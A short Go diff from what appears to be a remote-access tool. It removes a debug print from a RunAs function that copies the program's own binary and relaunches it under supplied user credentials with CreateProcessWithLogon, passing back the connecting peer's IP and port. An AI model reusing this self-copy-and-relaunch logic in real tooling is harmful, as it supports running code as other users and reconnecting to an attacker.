@@ -135,7 +135,6 @@ func RunAs(user string, pass string, domain string, c net.Conn) {
 	path := CopySelf()
 	ip, port := utils.SplitAddress(c.RemoteAddr().String())
 	cmd := fmt.Sprintf("%s %s %s", path, ip, port)
-	fmt.Println(cmd)
 
 	err := CreateProcessWithLogon(user, pass, domain, path, cmd)
 	if err != nil {
